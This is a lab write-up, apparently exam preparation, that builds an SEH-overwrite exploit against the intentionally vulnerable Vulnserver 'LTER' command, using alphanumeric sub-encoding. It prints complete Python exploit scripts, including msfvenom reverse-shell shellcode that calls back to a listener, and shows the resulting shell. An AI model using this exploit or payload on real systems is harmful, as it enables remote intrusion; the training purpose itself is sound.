---
layout: single
title: CTP/OSCE Prep -- 'LTER' SEH Overwrite v2.0!
date: 2019-6-03
classes: wide
header:
  teaser: /assets/images/CTP/immunity.jpg
tags:
  - buffer overflow
  - Windows
  - x86
  - shellcoding
  - exploit development
  - assembly
  - python
  - OSCE
  - CTP
  - SEH
--- 
![](/assets/images/CTP/1920x1080_Wallpaper.jpg)

## Introduction

This series of posts will focus on the concepts I'm learning/practicing in preparation for [CTP/OSCE](https://www.offensive-security.com/information-security-training/cracking-the-perimeter/). In this series of posts, I plan on exploring:
+ fuzzing,
+ vanilla EIP overwrite,
+ SEH overwrite, and
+ egghunters.

Writing these entries will force me to become intimately familiar with these topics, and hopefully you can get something out of them as well! 

In this particular post we'll be using the skills we picked up last post to find our own way to exploit the 'LTER' command with an SEH overwrite.

If you have not already done so, please read some of the posts in the 'CTP/OSCE Prep' series as this post will be **light** on review! 

## Background 

This will be our third go at the 'LTER' command on Vulnserver. 
+ [The first time](https://h0mbre.github.io/LTER_SEH_Exploit/), I failed miserably to use the SEH overwrite, but I ended up discovering an EIP overwrite vulnerability with a smaller fuzzing payload.
+ [The second time](https://h0mbre.github.io/LTER_SEH_Success/#), I used @doylersec's approach to the SEH overwrite and worked through the exploit step-by-step for hours and was finally able to complete my own exploit modeled off of Doyler's.

Armed with the ability to use alphanumeric shellcode and a better understanding than the first time around, let's try to come up with our own unique take on the exploit and try to come up with something that's original to us.

## Getting Started

We will pick up after taking the jump code in our 'next SEH address' 4 byte space to jump into our `D` buffer. At the moment, our exploit code looks like this: 
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

nSeh = '\x74\x06\x75\x04'

Seh = '\x2b\x17\x50\x62'

buffer += 'A' * 3514 
buffer += nSeh
buffer += Seh
buffer += 'D' * (4000 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()
```
## From `D` Buffer to Top of `A` Buffer

Once we use our netjump in the `nSeh`, we land at the top of our `D` buffer in the address space `0174FFCC`. (**Don't get too hung up on specific addresses as those will change from application instance to application instance, instead focus on the offsets or distances between two addresses. That number should remain static.**)

![](/assets/images/CTP/Ltertake3.JPG)

If we scroll down in the CPU Instructions pane to the bottom, you can see that the last `44` instruction is sitting at `0174FFFF`.

![](/assets/images/CTP/ohyeahLTER.JPG)

To figure out the distance between those two points we do: (`0174FFFF` - `0174FFCC` = `33` or 51 in decimal). So we have **some** room to play with. Previously I tried to make use of this space to jump all the way back to the top of our `A` buffer and put shellcode there but I couldn't make it work because I didn't quite have a good handle on the `SUB` or `ADD` encoding you have to do with the shellcode to make it alphanumeric. 

Let's see what we can do now that we understand it a little bit better.

### Adjusting ESP

As we know, the first thing we have to do before putting our encoded shellcode on the stack is adjust `ESP`. As you can see from our screenshot, `ESP` is residing at `0174ECA4` and we want to put it at the bottom of our `D` buffer since our decoded shellcode will be plopped 'ontop' of it as it's decoded. To figure out how much we have adjust `ESP` we do (`0174FFFF` - `0174ECA4` = `135B` or 4,955 in decimal). So we have to add quite a bit!

To do this, let's:
+ put the current value of `ESP` into `EAX`,
+ add `0x135B` from `EAX`,
+ put the value of `EAX` back into `ESP`. 

In assembly this will look like this: 
```nasm
push esp
pop eax
add ax, 0x135b
push eax
pop esp
```

To get the opcodes, we'll use `/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb`:
```terminal_session
nasm > push esp
00000000  54                push esp
nasm > pop eax
00000000  58                pop eax
nasm > add ax, 0x135b
00000000  66055B13          add ax,0x135b
nasm > push eax
00000000  50                push eax
nasm > pop esp
00000000  5C                pop esp
```

Now let's update our exploit to reflect this new `espAdj` and test it:
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

nSeh = '\x74\x06\x75\x04'

Seh = '\x2b\x17\x50\x62'

espAdj = '\x54\x58\x66\x05\x5b\x13\x50\x5c'
#push esp
#pop eax
#add ax, 0x135b
#push eax
#pop esp

buffer = 'A' * 3514 
buffer += nSeh
buffer += Seh
buffer += espAdj
buffer += 'D' * (4000 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()
```

![](/assets/images/CTP/ltertest.JPG)

As you can see, `ESP` now points to the bottom of our `D` buffer just as we wanted after we step through all of the `espAdj` code. So far so good. 

### Encoding a Long Jump Backwards
Next, we need to encode a long jump all the way back to the top of our `A` buffer. To do this, we will:
+ take a register (`EAX`), manipulate it so that it points towards the address at the top of our `A` buffer,
+ put that value into another register to save it (`EBX`) since we'll destroy the value in `EAX` with the encoding process,
+ and then finally `CALL EBX` which should jump us all the way back to the top of our `A` buffer. 

Let's take care of this before we start any encoding.

`EAX` is currently pointing at `0190FFFF` and we need it to point to the top of our `A` buffer at `0190F20A`. So we do (`0190FFFF` - `0190F20A` = `DF5` or 3,573 in decimal.) The reason I personally keep track of decimal values is because I'm good with regular math but not hex in general. So having a decimal value to reference keeps me grounded in Human Land. 

We normally would do a `sub ax, 0xdf5` and call it a day but unfortunately, this will end up as `\x66\x2d\xf5\0d` in our payload and `\xf5` is a bad character. 

So let's break this subtraction operation up into two chunks that avoids bad chars. Probably multiple ways to do this but I just broke this `df5` value into two chunks `0d` and `f5` and started calculating subtractions by hand. 

`0d` is already fine with us, so we don't need to mess with it much. 

Let's divide `f5` by two and see what we get. The Windows calc says the answer is `7a` but if we multiply `7a` by two, we get `f4`!! The calculator lied to us! In reality, when we divided `f5` by two, there was a remainder of 1. So something simple like that can ruin our math. So now we know that `7a` + `7b` = `f5` and both of those bytes are not restricted! So we know we need to do two sub instructions to get `f5` total:
+ Sub Operation 1 = subtract `7a`
+ Sub Operation 2 = subtract `7b`.

Perfect. But since we have to use a couple `SUB` operations, we have to come up with a way to subtract from our `0d` value that was already ok and not restricted. We don't want to put any instructions in that are `00` since that's a null byte. We can simply subtract `01` the first sub operation and the leftover amount `c7` in the second operation. No division required to figure that out. 
+ Sub Operation 1 = subtract `01`
+ Sub Operation 2 = subtract `c7`.

So all together our commands will look like: 
```nasm
sub ax, 0x017a
sub ax, 0x0c7b
```

This is the exact same thing as `sub ax, 0xdf5` except we don't use a restricted character, pretty cool!
```terminal_session
nasm > sub ax, 0x17a
00000000  662D7A01          sub ax,0x17a
nasm > sub ax, 0xc7b
00000000  662D7B0C          sub ax,0xc7b
```

Let's add the value `\x66\x2d\x7a\x01\x66\x2d\x7b\x0c` to a new variable `eaxAdj` and update our exploit code:
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

nSeh = '\x74\x06\x75\x04'

Seh = '\x2b\x17\x50\x62'

espAdj = '\x54\x58\x66\x05\x5b\x13\x50\x5c'
#push esp
#pop eax
#add ax, 0x135b
#push eax
#pop esp

eaxAdj = '\x66\x2d\x7a\x01\x66\x2d\x7b\x0c'
#sub ax, 0x017a
#sub ax, 0x0c7b
#points EAX towards beginning of our A buffer which is 0xdf5 away

buffer = 'A' * 3514 
buffer += nSeh
buffer += Seh
buffer += espAdj
buffer += eaxAdj
buffer += 'D' * (4000 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()
```

Testing it:
![](/assets/images/CTP/eaxmath.JPG)

Our math was correct and `EAX` now points to the top of our `A` buffer at `17EF20A`. 

Now we need to place this value into `EBX` and jump to it. Unfortunately, the opcode required to jump to `EBX` is restricted to us so we have to encode this bit. Let's go to our nasm shell to figure out what the raw opcodes would be. 
```terminal_session
nasm > push eax
00000000  50                push eax
nasm > pop ebx
00000000  5B                pop ebx
nasm > call ebx
00000000  FFD3              call ebx
```

Looks like our code will be: `\x50\x5b\xff\xd3`. We know `\x50` and `\x5b` are fine to use so we can place those in our exploit code already. We'll call this variable `switch`.

If you remember how the encoding process works, we need `EAX` to be set equal to our opcode instructions and then pushed onto the stack to get decoded. How do we get our current `EAX` register to equal `\xff\xd3`? First we need to zero the register out. In the previous post we learned that the following two `AND` instructions will zero `EAX` out every time:
+ and eax,0x554e4d4a; 
+ and eax,0x2a313235

Getting the opcodes:
```terminal_session
nasm > and eax,0x554e4d4a
00000000  254A4D4E55        and eax,0x554e4d4a
nasm > and eax,0x2a313235
00000000  253532312A        and eax,0x2a313235
```

So our zeroing out code is going to be: `\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A`. We can add this value to a variable called `zeroOut`.

Now all that's left is to encode `\xff\xd3`. I used an awesome tool called [Z3ncoder](https://github.com/marcosValle/z3ncoder) which does sub encoding. 

Installation spelled out in the readme:
+ `git clone https://github.com/marcosValle/z3ncoder`
+ `cd z3ncoder`
+ `pip install z3-solver`
+ `python3 solve.py`

There was some python vs. python3 package confusion after this so I just did `pip install z3-solver` and used python 2.7.

We need to remember that the code is read in the debugger display from right to left and we also have to pad our two bytes with two bytes of NOPs since we have to have a multiple of four. Luckily we spent 16 hours yesterday figuring out how this works! :) 

So given the reverse order requirement, and the 4 byte requirement, we need to encode `9090D3FF`. 

Let's use Z3ncoder. 
![](/assets/images/CTP/zen.gif)

```terminal_session
Solving for 0x9090d3ff
0xFFFFFFFF - 0x9090d3ff + 1 = 0x6f6f2c01
###########
0x217a3e2d
0x2b7a6e58
0x227a7f7c
###########
Check sum = 0x6f6f2c01
```

Opcodes:
```terminal_session
nasm > sub eax, 0x217a3e2d
00000000  2D2D3E7A21        sub eax,0x217a3e2d
nasm > sub eax, 0x2b7a6e58
00000000  2D586E7A2B        sub eax,0x2b7a6e58
nasm > sub eax, 0x227a7f7c
00000000  2D7C7F7A22        sub eax,0x227a7f7c
```

So our encoded shellcode will be: `\x2D\x2D\x3E\x7A\x21\x2D\x58\x6E\x7A\x2B\x2D\x7C\x7F\x7A\x22`. This will put the value `9090D3FF` into `EAX` once it's decoded. We'll call this variable `subEncode`. 

The last opcode we need to add is `push eax` which will actually decode the shellcode by placing the value held by `EAX` 'ontop' of our adjusted `ESP`. That opcode is simply `\x50`. We'll call this variable `pushEax`.

Our exploit code now looks like this: 
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

nSeh = '\x74\x06\x75\x04'

Seh = '\x2b\x17\x50\x62'

espAdj = '\x54\x58\x66\x05\x5b\x13\x50\x5c'
#push esp
#pop eax
#add ax, 0x135b
#push eax
#pop esp

eaxAdj = '\x66\x2d\x7a\x01\x66\x2d\x7b\x0c'
#sub ax, 0x017a
#sub ax, 0x0c7b
#points EAX towards beginning of our A buffer which is 0xdf5 away

switch = '\x50\x5b' # puts EAX into EBX, EBX now points to beginning of A buffer. We need to jump there. 

zeroOut = '\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A' #and eax,0x554e4d4a; and eax,0x2a313235

subEncode= '\x2D\x2D\x3E\x7A\x21\x2D\x58\x6E\x7A\x2B\x2D\x7C\x7F\x7A\x22'
#sub eax, 0x217a3e2d
#sub eax, 0x2b7a6e58
#sub eax, 0x227a7f7c

pushEax = '\x50'

buffer = 'A' * 3514 
buffer += nSeh
buffer += Seh
buffer += espAdj
buffer += eaxAdj
buffer += switch
buffer += zeroOut
buffer += subEncode
buffer += pushEax
buffer += 'D' * (4000 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()
```

If this works correctly, a red jump instruction to `EBX` at the top of our `A` buffer should pop onto our stack and we should pass control to it and jump. 

**BEFORE DECODING**
![](/assets/images/CTP/newnewbefore.JPG)

**AFTER DECODING**
![](/assets/images/CTP/newnewafter.JPG)

It works perfectly and we can now jump to the top of our buffer!

## Final Countdown

Now all we have to do is put our `msfvenom` payload at the top of our `A` buffer and run it. Unfortunately as I mentioned in the previous post, and as Offensive Security explains [here](https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/), even with the `-e x86/alpha_mixed` option, `msfvenom` will prepend `\x89\xe2\xdb\xdb\xd9\x72` to our payload which is **NOT** alphanumeric. The purpose of these opcodes is so the payload can determine where it is located in absolute memory, a work around is to use the `BufferRegister=REG32` option and specify a register that's pointed at our shellcode. 

`EBX` is pointed right at the beginning of our `A` buffer (we should know, we just called it and landed here). Unfortunately using `BufferRegister=EBX` does not get us a reverse shell for some reason. @ihack4falafel was nice enough to share with me that it could be due to some stack corruption related to the proximity of `ESP` and `EIP`. I don't quite understand yet why it doesn't work. 

So instead, I simply put in some Assembly here that ended up being 6 bytes long and used those 6 bytes to point `ESP` at `EBX + 6` which would have `ESP` pointing directly at our shellcode and we could try the `BufferRegister=ESP` option and see if that works. 

The Assembly is:
```nasm
push ebx
pop eax
add al, 0x6
push eax
pop esp
```

Opcodes:
```terminal_session
nasm > push ebx
00000000  53                push ebx
nasm > pop eax
00000000  58                pop eax
nasm > add al, 0x6
00000000  0406              add al,0x6
nasm > push eax
00000000  50                push eax
nasm > pop esp
00000000  5C                pop esp
```

So our last `espFinal` variable will hold the value: `\x53\x58\x04\x06\x50\x5c`

And then we place our shellcode behind this. I generated the shellcode with the command `msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.1.206 LPORT=443 -f c -b '\x00' -e x86/alpha_mixed BufferRegister=ESP` and updated our **FINAL** exploit code. 
```python
#!/usr/bin/python

import socket
import os
import sys

host = "192.168.1.201"
port = 9999

nSeh = '\x74\x06\x75\x04'

Seh = '\x2b\x17\x50\x62'

espAdj = '\x54\x58\x66\x05\x5b\x13\x50\x5c'
#push esp
#pop eax
#add ax, 0x135b
#push eax
#pop esp

eaxAdj = '\x66\x2d\x7a\x01\x66\x2d\x7b\x0c'
#sub ax, 0x017a
#sub ax, 0x0c7b
#points EAX towards beginning of our A buffer which is 0xdf5 away

switch = '\x50\x5b' # puts EAX into EBX, EBX now points to beginning of A buffer. We need to jump there. 

zeroOut = '\x25\x4A\x4D\x4E\x55\x25\x35\x32\x31\x2A' #and eax,0x554e4d4a; and eax,0x2a313235

subEncode= '\x2D\x2D\x3E\x7A\x21\x2D\x58\x6E\x7A\x2B\x2D\x7C\x7F\x7A\x22'
#sub eax, 0x217a3e2d
#sub eax, 0x2b7a6e58
#sub eax, 0x227a7f7c

pushEax = '\x50'

espFinal = '\x53\x58\x04\x06\x50\x5c'
#push ebx
#pop eax
#add al, 0x6
#push eax
#pop esp

#msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.1.206 LPORT=443 -f c -b '\x00' -e x86/alpha_mixed BufferRegister=ESP
#Payload size: 702 bytes
shellcode = ("\x54\x59\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49"
"\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41\x30\x41\x6b"
"\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42\x42\x41\x42\x58"
"\x50\x38\x41\x42\x75\x4a\x49\x79\x6c\x6d\x38\x6d\x52\x37\x70"
"\x75\x50\x67\x70\x61\x70\x4e\x69\x38\x65\x34\x71\x6b\x70\x75"
"\x34\x4c\x4b\x50\x50\x36\x50\x6c\x4b\x63\x62\x54\x4c\x6e\x6b"
"\x63\x62\x77\x64\x6c\x4b\x74\x32\x74\x68\x54\x4f\x4f\x47\x30"
"\x4a\x77\x56\x74\x71\x79\x6f\x4e\x4c\x37\x4c\x31\x71\x53\x4c"
"\x55\x52\x46\x4c\x71\x30\x5a\x61\x58\x4f\x76\x6d\x77\x71\x49"
"\x57\x6d\x32\x6a\x52\x42\x72\x76\x37\x4e\x6b\x61\x42\x76\x70"
"\x4c\x4b\x70\x4a\x77\x4c\x6e\x6b\x62\x6c\x57\x61\x42\x58\x5a"
"\x43\x57\x38\x57\x71\x4a\x71\x53\x61\x4c\x4b\x30\x59\x75\x70"
"\x57\x71\x6b\x63\x6c\x4b\x70\x49\x42\x38\x4d\x33\x67\x4a\x70"
"\x49\x6e\x6b\x64\x74\x6c\x4b\x36\x61\x79\x46\x44\x71\x79\x6f"
"\x6e\x4c\x6b\x71\x58\x4f\x36\x6d\x73\x31\x4a\x67\x57\x48\x49"
"\x70\x44\x35\x7a\x56\x76\x63\x33\x4d\x6b\x48\x37\x4b\x63\x4d"
"\x64\x64\x52\x55\x4a\x44\x73\x68\x6c\x4b\x66\x38\x65\x74\x55"
"\x51\x78\x53\x63\x56\x4c\x4b\x54\x4c\x70\x4b\x4c\x4b\x66\x38"
"\x57\x6c\x67\x71\x69\x43\x6e\x6b\x57\x74\x6e\x6b\x53\x31\x6e"
"\x30\x4b\x39\x71\x54\x47\x54\x31\x34\x31\x4b\x51\x4b\x51\x71"
"\x53\x69\x33\x6a\x73\x61\x39\x6f\x79\x70\x71\x4f\x31\x4f\x42"
"\x7a\x4e\x6b\x55\x42\x38\x6b\x6e\x6d\x63\x6d\x55\x38\x30\x33"
"\x47\x42\x35\x50\x47\x70\x63\x58\x51\x67\x51\x63\x77\x42\x33"
"\x6f\x42\x74\x30\x68\x70\x4c\x70\x77\x65\x76\x75\x57\x39\x6f"
"\x4e\x35\x4d\x68\x4c\x50\x46\x61\x77\x70\x73\x30\x37\x59\x4a"
"\x64\x46\x34\x66\x30\x30\x68\x35\x79\x4b\x30\x52\x4b\x45\x50"
"\x69\x6f\x4e\x35\x52\x70\x52\x70\x62\x70\x32\x70\x47\x30\x66"
"\x30\x57\x30\x72\x70\x43\x58\x69\x7a\x66\x6f\x79\x4f\x4b\x50"
"\x69\x6f\x38\x55\x5a\x37\x72\x4a\x34\x45\x30\x68\x6b\x70\x4d"
"\x78\x77\x71\x58\x4e\x30\x68\x57\x72\x67\x70\x47\x71\x4f\x4b"
"\x4d\x59\x5a\x46\x61\x7a\x32\x30\x73\x66\x76\x37\x65\x38\x4f"
"\x69\x6c\x65\x61\x64\x70\x61\x6b\x4f\x59\x45\x6b\x35\x6f\x30"
"\x72\x54\x36\x6c\x69\x6f\x52\x6e\x55\x58\x30\x75\x58\x6c\x73"
"\x58\x6a\x50\x6e\x55\x6e\x42\x72\x76\x69\x6f\x4a\x75\x32\x48"
"\x35\x33\x30\x6d\x63\x54\x65\x50\x6d\x59\x49\x73\x36\x37\x66"
"\x37\x72\x77\x50\x31\x49\x66\x70\x6a\x66\x72\x43\x69\x51\x46"
"\x4b\x52\x39\x6d\x73\x56\x79\x57\x72\x64\x64\x64\x37\x4c\x56"
"\x61\x53\x31\x4c\x4d\x73\x74\x31\x34\x74\x50\x69\x56\x55\x50"
"\x61\x54\x61\x44\x42\x70\x76\x36\x42\x76\x70\x56\x37\x36\x50"
"\x56\x32\x6e\x52\x76\x61\x46\x71\x43\x33\x66\x53\x58\x52\x59"
"\x68\x4c\x55\x6f\x6d\x56\x59\x6f\x68\x55\x6e\x69\x69\x70\x42"
"\x6e\x30\x56\x33\x76\x69\x6f\x36\x50\x42\x48\x75\x58\x6f\x77"
"\x57\x6d\x43\x50\x49\x6f\x58\x55\x6f\x4b\x39\x70\x37\x6d\x57"
"\x5a\x35\x5a\x31\x78\x49\x36\x4d\x45\x4f\x4d\x6d\x4d\x79\x6f"
"\x7a\x75\x65\x6c\x37\x76\x31\x6c\x44\x4a\x6f\x70\x59\x6b\x4d"
"\x30\x71\x65\x65\x55\x6d\x6b\x67\x37\x74\x53\x30\x72\x30\x6f"
"\x61\x7a\x77\x70\x61\x43\x6b\x4f\x6b\x65\x41\x41")

buffer = espFinal
buffer += shellcode
buffer += 'A' * (3514 - len(espFinal) - len(shellcode)) 
buffer += nSeh
buffer += Seh
buffer += espAdj
buffer += eaxAdj
buffer += switch
buffer += zeroOut
buffer += subEncode
buffer += pushEax
buffer += 'D' * (4000 - len(buffer))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print s.recv(1024)
s.send("LTER /.../" + buffer)
print s.recv(1024)
s.close()
```

The last check is we'll step through everything one last time to make sure that `ESP` is pointed right at the start of our shellcode before the first instruction of the shellcode executes. 

![](/assets/images/CTP/ynowork.JPG)

It's aligned perfectly and we catch a reverse shell!
```terminal_session
astrid:~/ # nc -lvp 443                                                                                                                [20:11:10]
listening on [any] 443 ...
192.168.1.201: inverse host lookup failed: Unknown host
connect to [192.168.1.206] from (UNKNOWN) [192.168.1.201] 49262
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\IEUser\Desktop>
```

## Conclusion
Lots of sleep lost on this 'LTER' command but I think it was all worth it. As with anything you're new to it takes a lot of time investment to get any better. Once again huge thanks to @doylersec for all of his help and to @ihack4falafel for his help as well. 

It was extremely gratifying to pull off my own version of the exploit using the technique I spent all day learning. Thanks for reading!

## Big Thanks

To everyone who has published free intro-level 32 bit exploit dev material, I'm super appreciative. Truly mean it. 

## Resources
+ [OffSec Alphanumeric Shellcode](https://www.offensive-security.com/metasploit-unleashed/alphanumeric-shellcode/)
+ [Corelan Mona Tutorial](https://www.corelan.be/index.php/2011/07/14/mona-py-the-manual/)
+ [Doyler LTER SEH Overwrite Part 1](https://www.doyler.net/security-not-included/lter-seh-continued)
+ [Doyler LTER SEH Overwrite Part 2](https://www.doyler.net/security-not-included/lter-seh-continued)
+ [VelloSec Carving Shellcode](http://vellosec.net/2018/08/carving-shellcode-using-restrictive-character-sets/)
+ [Slink by @ihack4falafel](https://github.com/ihack4falafel/Slink)
+ [Zencoder](https://github.com/marcosValle/z3ncoder)
